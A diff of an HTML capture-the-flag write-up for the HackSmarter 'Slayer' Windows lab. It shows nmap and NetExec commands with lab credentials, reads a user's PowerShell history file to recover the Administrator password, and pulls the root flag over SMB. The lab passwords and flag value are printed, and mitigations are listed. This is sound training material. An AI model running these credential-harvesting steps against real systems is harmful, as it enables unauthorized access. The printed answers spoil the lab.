@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>HackSmarter Slayer (Easy) — PowerShell history to Administrator</title>
+<title>HackSmarter Slayer (Easy): PowerShell history to Administrator</title>
 <style>
   :root {
     --bg: #0b111b; --panel: #121a27; --text: #e6eef7; --muted: #9fb0c3;
@@ -63,200 +63,143 @@
 
 <div class="hero">
   <span class="pill">HackSmarter · Windows · Easy</span>
-  <h1>Slayer: PowerShell history password → Administrator</h1>
-  <p class="muted">Authorized lab write-up. Author of lab: Ryan Yager. Solved 2026-08-06.</p>
+  <h1>Slayer: PowerShell history password to Administrator</h1>
+  <p class="muted">Authorized lab only. Lab author: Ryan Yager. Solved 2026-08-06.</p>
 </div>
 
 <table class="meta">
-  <tr><td>Challenge / Box</td><td>Slayer</td></tr>
+  <tr><td>Box</td><td>Slayer</td></tr>
   <tr><td>Platform</td><td>HackSmarter (DEFCON free access)</td></tr>
-  <tr><td>Category</td><td>Windows privilege escalation / credential residue</td></tr>
-  <tr><td>Vulnerability</td><td>Cleartext admin password in PSReadLine history</td></tr>
-  <tr><td>Difficulty</td><td>Easy</td></tr>
-  <tr><td>Target (lab)</td><td><code>10.1.176.119</code> · host <code>EC2AMAZ-M1LFCNO</code></td></tr>
-  <tr><td>Outcome</td><td>Full compromise · root flag on Administrator Desktop</td></tr>
+  <tr><td>Type</td><td>Windows privilege rise from stored commands</td></tr>
+  <tr><td>Fault</td><td>Clear admin password in PSReadLine history</td></tr>
+  <tr><td>Level</td><td>Easy</td></tr>
+  <tr><td>Target</td><td><code>10.1.176.119</code> host <code>EC2AMAZ-M1LFCNO</code></td></tr>
+  <tr><td>Result</td><td>Admin and root flag on Desktop</td></tr>
 </table>
 
-<h2>Pre-req knowledge</h2>
+<h2>What you need to know</h2>
 <ul>
-  <li>Windows local accounts vs domain; NTLM auth over SMB and RDP</li>
-  <li>How NetExec (<code>nxc</code>) proves credentials and runs remote commands</li>
-  <li>Where PowerShell stores interactive history (PSReadLine)</li>
-  <li>Why history and transcripts are high-value on multi-user or “handed” workstations</li>
+  <li>Local Windows accounts and NTLM over SMB and RDP</li>
+  <li>NetExec to prove passwords and run remote commands</li>
+  <li>Where PowerShell stores history (PSReadLine)</li>
+  <li>Why history files matter on shared or handed workstations</li>
 </ul>
 
-<h2>Core concept (one line)</h2>
-<p><strong>If a low-priv user can read their own PowerShell history, any <code>net user Administrator …</code> command they (or malware) typed becomes a ready-made privilege escalation.</strong></p>
-
-<h2>Introduction</h2>
+<h2>Main idea</h2>
 <p>
-After social engineering, the engagement hands you workstation credentials for
-<code>tyler.ramsey</code>. The host is a standalone Windows machine on an EC2-style
-build. Remote management is thin: SMB and RDP work; WinRM is filtered.
-The win is not a fancy potato exploit. It is <strong>credential archaeology</strong>
-on the interactive shell history.
+If a low rights user can read PowerShell history, any
+<code>net user Administrator …</code> line becomes a ready password for privilege rise.
 </p>
 
-<h2>Root cause</h2>
+<h2>Story</h2>
 <p>
-Someone ran <code>net user administrator "&lt;password&gt;"</code> in a PowerShell session
-that belonged to (or wrote into) tyler’s history file. Windows stored that
-line in cleartext under PSReadLine. The password still authenticated as the
-local Administrator. Cryptography was never broken — <strong>operator hygiene was</strong>.
+You get <code>tyler.ramsey</code> after social engineering. The host is a single Windows box.
+SMB and RDP work. WinRM is filtered. The win is not a potato exploit.
+It is reading shell history and reusing a password.
+</p>
+
+<h2>Why it works</h2>
+<p>
+Someone ran <code>net user administrator "…"</code> in a PowerShell session that wrote to tyler history.
+Windows stored that line in clear text. The password still worked as local Administrator.
 </p>
 
 <pre>Client (Kali)
    │  tyler.ramsey:P@ssw0rd!
    ▼
-SMB 445 / RDP 3389  ──►  tyler (low priv)
+SMB 445 / RDP 3389  →  tyler (low rights)
    │
    │  read ConsoleHost_history.txt
    ▼
-Administrator password recovered
+Administrator password
    │
    ▼
 C$\Users\Administrator\Desktop\root.txt</pre>
 
-<h3>Step 1: Reach the host and map services</h3>
-<div class="why"><strong>Why we do this:</strong> Confirm VPN routing and which remote protocols you can use before you burn time on dead WinRM.</div>
+<h3>Step 1: Reach the host and map ports</h3>
+<div class="why"><strong>Why:</strong> Confirm VPN and which remote paths you can use.</div>
 <pre>ping -c 1 10.1.176.119
 nmap -Pn -n --top-ports 100 -T4 10.1.176.119</pre>
-<p><strong>First principles</strong></p>
-<ul>
-  <li><code>ping</code> — ICMP reachability through the lab VPN (not a security control).</li>
-  <li><code>nmap -Pn</code> — treat host as up; scan without host discovery.</li>
-  <li>Open here: <code>135</code> RPC, <code>445</code> SMB, <code>3389</code> RDP. WinRM <code>5985/5986</code> filtered.</li>
-</ul>
-<p><strong>What you should see:</strong> Host up; those three ports open.</p>
+<p><strong>Expect:</strong> host up. Ports 135, 445, 3389 open. WinRM filtered.</p>
 
-<h3>Step 2: Prove the handed credentials</h3>
-<div class="why"><strong>Why we do this:</strong> SE “works” only if the password is still valid on SMB and/or RDP. NetExec tells you that in one line.</div>
+<h3>Step 2: Prove the handed password</h3>
+<div class="why"><strong>Why:</strong> A handed password only helps if SMB or RDP still accepts it.</div>
 <pre>nxc smb 10.1.176.119 -u tyler.ramsey -p 'P@ssw0rd!' --local-auth
 nxc rdp 10.1.176.119 -u tyler.ramsey -p 'P@ssw0rd!' --local-auth</pre>
-<p><strong>First principles</strong></p>
-<ul>
-  <li><code>--local-auth</code> — authenticate to the machine account SAM, not a domain controller.</li>
-  <li>SMB <code>[+]</code> — NTLM accepted; not necessarily local admin.</li>
-  <li>RDP <code>(Pwn3d!)</code> — credentials allow interactive logon (RDP Users).</li>
-</ul>
-<p><strong>What you should see:</strong> Host name <code>EC2AMAZ-M1LFCNO</code>, auth success, shares without <code>C$</code>/<code>ADMIN$</code> write for tyler.</p>
+<p><strong>Expect:</strong> host <code>EC2AMAZ-M1LFCNO</code>, auth OK, no admin shares for tyler.</p>
 
 <figure>
-  <img src="images/01-user-desktop.png" alt="RDP screenshot as tyler.ramsey" />
-  <figcaption>Figure 1 — RDP session as tyler.ramsey (nxc --screenshot).</figcaption>
+  <img src="images/01-user-desktop.png" alt="RDP as tyler.ramsey" />
+  <figcaption>Figure 1. RDP as tyler.ramsey.</figcaption>
 </figure>
 
-<h3>Step 3: Take a foothold and identity snapshot</h3>
-<div class="why"><strong>Why we do this:</strong> Know groups and privileges before you pick a PE class. No SeImpersonate means potato-style tokens are not the first bet.</div>
+<h3>Step 3: Identity snapshot</h3>
+<div class="why"><strong>Why:</strong> Know groups and rights before you pick a rise path.</div>
 <pre>printf 'Y\n' | nxc rdp 10.1.176.119 -u tyler.ramsey -p 'P@ssw0rd!' --local-auth -x 'whoami /all'</pre>
-<p><strong>First principles</strong></p>
-<ul>
-  <li><code>nxc rdp -x</code> — log on over RDP, run a command, return output via clipboard automation.</li>
-  <li><code>whoami /all</code> — SID, groups, privileges for the token you actually hold.</li>
-</ul>
-<p><strong>What you should see:</strong> Groups include <code>Remote Desktop Users</code>, <code>Users</code>, <code>Performance Log Users</code>. Privileges only <code>SeChangeNotifyPrivilege</code> and <code>SeIncreaseWorkingSetPrivilege</code>. Medium integrity.</p>
+<p><strong>Expect:</strong> Remote Desktop Users, Users, Performance Log Users. Low privileges. Medium integrity.</p>
 
-<h3>Step 4: Enumerate user homes (signal for lateral local accounts)</h3>
-<div class="why"><strong>Why we do this:</strong> Other profiles on disk mean other secrets, tasks, or mis-ACLs. Here we learn <code>alice.wonderland</code> and <code>Administrator</code> exist.</div>
+<h3>Step 4: List user homes</h3>
+<div class="why"><strong>Why:</strong> Other profiles mean other secrets or accounts.</div>
 <pre>printf 'Y\n' | nxc rdp 10.1.176.119 -u tyler.ramsey -p 'P@ssw0rd!' --local-auth -x 'dir C:\Users'</pre>
-<p><strong>What you should see:</strong> <code>Administrator</code>, <code>alice.wonderland</code>, <code>Public</code>, <code>tyler.ramsey</code>.</p>
+<p><strong>Expect:</strong> Administrator, alice.wonderland, Public, tyler.ramsey.</p>
 
-<h3>Step 5: Read PowerShell history (winning move)</h3>
-<div class="why"><strong>Why we do this:</strong> Interactive shells leave durable residue. On Windows 10/11, PSReadLine history is a plain-text file under the user’s roaming profile.</div>
+<h3>Step 5: Read PowerShell history</h3>
+<div class="why"><strong>Why:</strong> Interactive shells leave plain text history under the user profile.</div>
 <pre>printf 'Y\n' | nxc rdp 10.1.176.119 -u tyler.ramsey -p 'P@ssw0rd!' --local-auth \
   -x 'type C:\Users\tyler.ramsey\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'</pre>
-<p><strong>First principles</strong></p>
-<ul>
-  <li><code>ConsoleHost_history.txt</code> — default PSReadLine log of commands typed in powershell.exe.</li>
-  <li><code>type</code> — print file contents; works when you have read ACL on your own profile.</li>
-  <li>History is not encrypted. It is a forensic gift and an attacker gift.</li>
-</ul>
-<p><strong>What you should see:</strong> a line equivalent to:</p>
+<p><strong>Expect</strong> a line like:</p>
 <pre>net user administrator "ebz0yxy3txh9BDE*yeh"</pre>
-<p>That is a local password set for Administrator, recorded forever in the user history.</p>
 
-<h3>Step 6: Authenticate as Administrator</h3>
-<div class="why"><strong>Why we do this:</strong> Reuse the recovered password. If it still works, you own the box without kernel exploits.</div>
+<h3>Step 6: Log on as Administrator</h3>
+<div class="why"><strong>Why:</strong> Reuse the password. If it still works, you own the box.</div>
 <pre>nxc smb 10.1.176.119 -u Administrator -p 'ebz0yxy3txh9BDE*yeh' --local-auth
 # expect: (Pwn3d!)</pre>
-<p><strong>First principles</strong></p>
-<ul>
-  <li>Local Administrator with a known password can open <code>C$</code> and run high-priv remote methods.</li>
-  <li><code>(Pwn3d!)</code> in NetExec SMB usually means admin-level access was detected.</li>
-</ul>
 
 <figure>
-  <img src="images/02-admin-desktop.png" alt="RDP screenshot as Administrator" />
-  <figcaption>Figure 2 — RDP as Administrator after history password reuse.</figcaption>
+  <img src="images/02-admin-desktop.png" alt="RDP as Administrator" />
+  <figcaption>Figure 2. RDP as Administrator after history reuse.</figcaption>
 </figure>
 
 <h3>Step 7: Read the root flag</h3>
-<div class="why"><strong>Why we do this:</strong> Lab objective — flag in the administrator directory.</div>
+<div class="why"><strong>Why:</strong> Lab goal. Flag sits on the admin Desktop.</div>
 <pre>smbclient //10.1.176.119/C$ -U 'Administrator%ebz0yxy3txh9BDE*yeh' \
   -c 'get Users\Administrator\Desktop\root.txt root.txt'
 cat root.txt</pre>
-<p><strong>First principles</strong></p>
-<ul>
-  <li><code>C$</code> — hidden administrative share of the system volume; requires admin rights.</li>
-  <li><code>smbclient get</code> — pull a file over SMB without interactive desktop.</li>
-</ul>
 <div class="flag">3835538c50e819f392144ae9ef125496</div>
 
-<h2>Security impact</h2>
+<h2>Impact</h2>
 <ul>
-  <li>Full local privilege escalation from a single handed user account</li>
-  <li>Cleartext recovery of the most privileged local account</li>
-  <li>Silent path — no exploit reliability issues, only file read + auth</li>
+  <li>Full local rise from one handed user</li>
+  <li>Clear admin password recovered from disk</li>
+  <li>Path is file read plus auth only</li>
 </ul>
 
-<h2>Mitigation</h2>
+<h2>Fix</h2>
 <ul>
-  <li>Never set Administrator passwords from a low-priv interactive session.</li>
-  <li>Clear or disable PSReadLine history on shared / training / VDI images; use constrained language where possible.</li>
-  <li>Prefer LAPS (or equivalent) for local admin secrets; randomize after each use.</li>
-  <li>Detect Event ID 4724 / password-change activity and unusual readers of <code>ConsoleHost_history.txt</code>.</li>
-  <li>Segment RDP; require MFA on production bastions.</li>
+  <li>Do not set Administrator passwords from a low rights interactive shell.</li>
+  <li>Clear or turn off PSReadLine history on shared and VDI images.</li>
+  <li>Use LAPS or equal for local admin secrets. Rotate after use.</li>
+  <li>Watch password change events and readers of <code>ConsoleHost_history.txt</code>.</li>
+  <li>Segment RDP. Use MFA on real bastions.</li>
 </ul>
 
-<h2>Beyond Root</h2>
-<h3>Path under the microscope</h3>
+<h2>Extra notes</h2>
+<ul>
+  <li>If history is wiped, hunt transcripts, scripts, browser stores, DPAPI.</li>
+  <li>If RDP is closed, map more ports for WinRM or other shells.</li>
+  <li>If the password rotated, move to classic service and task abuse.</li>
+  <li>Ops: <code>~/htb/slayer/ATTACK_LOG.md</code>, loot, screenshots</li>
+</ul>
+
+<h2>Close</h2>
 <p>
-The path works because three conditions line up: (1) you can log on as the user who owns the history file, (2) the history still contains a high-value secret, (3) the secret was not rotated after it was typed. Fail any one condition and the chain dies.
-</p>
-<h3>First principles drill</h3>
-<ul>
-  <li><strong>Trust boundary:</strong> “My history is private to me” — true for other users, false against yourself and anyone who steals your session.</li>
-  <li><strong>Transform:</strong> interactive typing → append to PSReadLine file → durable disk secret.</li>
-  <li><strong>Sink:</strong> <code>net user</code> / SAM accepts the password later via NTLM.</li>
-  <li><strong>Canary:</strong> read history for <code>net user</code>, <code>ConvertTo-SecureString</code>, <code>-AsPlainText</code>, <code>password</code>.</li>
-</ul>
-<h3>Blue team — stop the vuln</h3>
-<ul>
-  <li>Group Policy: disable history / set max history 0 on jump hosts.</li>
-  <li>Block interactive admin password management; use privileged access workstations.</li>
-  <li>EDR: alert on non-admin processes reading other users’ history (and on admin password set from user context).</li>
-</ul>
-<h3>If the CTF shortcut dies</h3>
-<ol>
-  <li>History wiped → hunt transcripts, <code>.ps1</code> in Documents, browser password stores, DPAPI.</li>
-  <li>No RDP → need WinRM, SSH, or physical/console; expand port map.</li>
-  <li>Password rotated → classic PE (services, tasks, AlwaysInstallElevated, mis-ACLs on <code>SysMgmtAgent</code>-style custom services).</li>
-</ol>
-<h3>Document the engagement</h3>
-<ul>
-  <li>Local short note: <code>wiki/red/HTB-CJCA/hack-smarter-labs/slayer.md</code></li>
-  <li>Ops: <code>~/htb/slayer/ATTACK_LOG.md</code>, <code>loot/root.txt</code>, screenshots</li>
-  <li>Public detailed: this page on mccleod1290.github.io</li>
-</ul>
-
-<h2>Conclusion</h2>
-<p>
-Slayer rewards thorough post-foothold hygiene checks. The “exploit” is reading a file you already own and reusing a password that should never have lived in a user shell log. That pattern transfers to every real engagement where operators type secrets into interactive consoles.
+Slayer rewards post foothold hygiene. The exploit is reading a file you already own
+and reusing a password that must not live in shell history.
 </p>
 
 <footer>
-  <p>Authorized training write-up only. Do not use these steps against systems without permission.</p>
-  <p><a href="../../">← mccleod1290.github.io</a> · HackSmarter labs series</p>
+  <p>Authorized training only. Do not use these steps without permission.</p>
+  <p><a href="../../">mccleod1290.github.io</a> · <a href="../">HackSmarter labs</a></p>
 </footer>
 
 </div>
